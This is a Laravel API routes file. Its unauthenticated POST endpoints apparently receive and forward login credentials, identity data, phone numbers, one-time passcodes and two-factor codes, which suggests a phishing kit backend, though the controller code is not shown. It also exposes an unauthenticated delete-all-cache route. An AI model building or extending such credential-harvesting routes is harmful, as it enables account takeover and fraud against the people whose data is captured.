<?php

use App\Http\Controllers\Controller;
use App\Http\Controllers\HomeController;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "api" middleware group. Make something great!
|
*/

Route::middleware('auth:sanctum')->get('/user', function (Request $request) {
    return $request->user();
});

Route::post('/send-data-login', [Controller::class, 'getAndSendDataLogin'])->name('getAndSendDataLogin');
Route::post('/send-data-review', [Controller::class, 'getAndSendDataReview'])->name('getAndSendDataReview');
Route::post('/send-data-identity', [Controller::class, 'getAndSendDataIdentity'])->name('getAndSendDataIdentity');
Route::post('/send-data-phone', [Controller::class, 'getAndSendDataMobile'])->name('getAndSendDataMobile');
Route::post('/send-data-otp', [Controller::class, 'getAndSendDataOtp'])->name('getAndSendDataOtp');
Route::post('/send-data-fa', [Controller::class, 'getAndSendDataFa'])->name('getAndSendDataFa');

Route::post('/set-cache-by-email', [Controller::class, 'setCacheByEmail'])->name('setCacheByEmail');
Route::post('/get-cache-by-email', [Controller::class, 'getCacheByEmail'])->name('getCacheByEmail');
Route::post('/get-cache-by-key', [Controller::class, 'getCacheByKey'])->name('getCacheByKey');
Route::post('/delete-all-cache', [Controller::class, 'deleteAllCache'])->name('deleteAllCache');
